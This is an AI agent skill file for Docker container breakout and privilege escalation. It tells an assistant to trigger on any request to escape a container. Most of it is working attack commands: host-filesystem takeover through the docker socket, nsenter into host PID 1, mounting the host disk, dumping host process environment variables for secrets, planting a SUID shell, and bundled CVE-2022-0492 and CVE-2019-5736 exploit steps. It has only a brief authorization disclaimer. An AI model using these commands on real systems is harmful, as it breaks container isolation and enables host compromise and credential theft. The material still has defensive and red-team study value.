---
name: docker-breakout
description: Docker container escape and privilege escalation techniques. Use this skill whenever the user is inside a Docker container and wants to escape to the host, enumerate container security configurations, check for exposed docker sockets, abuse capabilities, exploit privileged containers, or perform any container breakout attack. Trigger on mentions of container escape, docker breakout, container privilege escalation, docker socket, privileged containers, cgroup exploits, or namespace abuse.
---

# Docker Breakout / Privilege Escalation

A comprehensive guide for escaping Docker containers and escalating privileges to the host system.

## When to Use This Skill

Use this skill when:
- You're inside a Docker container and want to escape to the host
- You need to enumerate container security configurations
- You've found an exposed docker socket and want to exploit it
- You're testing container security or doing red teaming
- You need to check for capability-based escape vectors
- You're dealing with privileged containers or namespace abuse

## Quick Start

1. **Enumerate first** - Run the enumeration script to understand your container's security posture
2. **Check for easy wins** - Docker socket, privileged mode, host namespaces
3. **Try capability-based escapes** - Check for dangerous capabilities
4. **Use CVE exploits** - If applicable to your container runtime

## Phase 1: Container Enumeration

Before attempting escapes, understand your container's security configuration.

### Automatic Enumeration Tools

Several tools can help enumerate container configurations:

- **linPEAS**: Can enumerate containers and find escape vectors
- **CDK (Container-Diagnostic-Kit)**: Enumerates containers and attempts automatic escapes
- **amicontained**: Shows container privileges and escape possibilities
- **deepce**: Enumerates and escapes from containers
- **grype**: Finds CVEs in installed software

### Manual Enumeration

Run the bundled enumeration script:

```bash
./scripts/enumerate_container.sh
```

Or manually check:

```bash
# Check if docker socket is mounted
find / -name docker.sock 2>/dev/null

# Check container capabilities
capsh --print

# Check if running as root
id

# Check for mounted volumes
mount | grep -E 'host|/proc|/sys'

# Check for sensitive mounts
ls -la /proc/1/root/ 2>/dev/null
```

## Phase 2: Docker Socket Escape

If the docker socket is mounted inside the container, you can escape.

### Find the Docker Socket

```bash
# Search for docker socket
find / -name docker.sock 2>/dev/null
# Usually at /run/docker.sock

# Check for other runtime sockets
ls -la /var/run/dockershim.sock 2>/dev/null
ls -la /run/containerd/containerd.sock 2>/dev/null
ls -la /var/run/crio/crio.sock 2>/dev/null
```

### Exploit the Socket

Run the bundled script:

```bash
./scripts/docker_socket_escape.sh
```

Or manually:

```bash
# List available images
docker images

# Run container with host filesystem mounted
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access via nsenter
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# If socket is in unexpected location
docker -H unix:///path/to/docker.sock images
```

## Phase 3: Capabilities Abuse

Check for dangerous capabilities that enable escapes.

### Check Capabilities

```bash
capsh --print
```

### Dangerous Capabilities

These capabilities may allow container escape:

- **CAP_SYS_ADMIN** - Most dangerous, enables many escapes
- **CAP_SYS_PTRACE** - Process tracing, can read other processes
- **CAP_SYS_MODULE** - Load kernel modules
- **DAC_READ_SEARCH** - Bypass file read permission checks
- **DAC_OVERRIDE** - Bypass all file permission checks
- **CAP_SYS_RAWIO** - Raw I/O access
- **CAP_SYSLOG** - Syslog access
- **CAP_NET_RAW** - Raw network access
- **CAP_NET_ADMIN** - Network administration

### Recover Capabilities

If `unshare` syscall is not forbidden:

```bash
unshare -UrmCpf bash
cat /proc/self/status | grep CapEff
```

## Phase 4: Privileged Container Escapes

Privileged containers have significantly reduced security.

### Identify Privileged Mode

```bash
# Check for privileged indicators
cat /proc/self/status | grep CapEff
mount | grep -E 'host|privileged'
```

### Privileged + hostPID Escape

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### Mount Host Disk

```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```

### CVE-2022-0492 (release_agent)

Run the bundled exploit script:

```bash
./scripts/release_agent_exploit.sh
```

This exploits the cgroup release_agent mechanism to execute code on the host.

## Phase 5: Namespace Abuse

### hostPID Namespace

```bash
# List host processes
ps auxn

# Steal environment variables from host processes
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done

# Access process file descriptors
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt

# Enter process namespace
nsenter --target <pid> --all
```

### hostNetwork Namespace

```bash
# Sniff all host traffic
tcpdump -i eth0

# Access localhost services
# Access cloud metadata services
```

### hostIPC Namespace

```bash
# Check shared memory
ls -la /dev/shm

# Inspect IPC facilities
ipcs -a
```

## Phase 6: Sensitive Mounts

Check for sensitive files that may be mounted:

```bash
# Check for release_agent
find /sys/fs/cgroup -name release_agent 2>/dev/null

# Check for binfmt_misc
cat /proc/sys/fs/binfmt_misc/* 2>/dev/null

# Check for core_pattern
cat /proc/sys/kernel/core_pattern 2>/dev/null

# Check for uevent_helper
cat /sys/kernel/uevent_helper 2>/dev/null

# Check for modprobe
cat /proc/sys/kernel/modprobe 2>/dev/null
```

## Phase 7: Arbitrary Mounts

If volumes are mounted from the host:

```bash
# Check mounted volumes
mount | grep -v 'cgroup|proc|sysfs'

# Look for writable host paths
find / -writable -type d 2>/dev/null | head -20

# Modify binaries in mounted /usr/bin or /bin
# Create SUID files for privilege escalation
cp /bin/bash ./bash
chown root:root bash
chmod 4777 bash
```

## Phase 8: CVE Exploits

### CVE-2019-5736 (runc)

If you can execute `docker exec` as root:

```bash
# Build and run the exploit
go build main.go
./main

# From host, trigger the payload
docker exec -it <container-name> /bin/sh
```

## Bundled Scripts

The following scripts are available in the `scripts/` directory:

- **enumerate_container.sh** - Comprehensive container enumeration
- **docker_socket_escape.sh** - Docker socket exploitation
- **release_agent_exploit.sh** - CVE-2022-0492 exploit
- **capabilities_check.sh** - Detailed capability analysis
- **namespace_escape.sh** - Namespace-based escape attempts

## Safety Notes

- These techniques are for authorized security testing only
- Container escapes can cause system instability
- Always have proper authorization before testing
- Document your findings and remediate vulnerabilities

## References

- [Trail of Bits: Understanding Docker Container Escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [CVE-2022-0492 Analysis](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
- [Privileged Container Escape](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [Container Escape Cheat Sheet](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/)
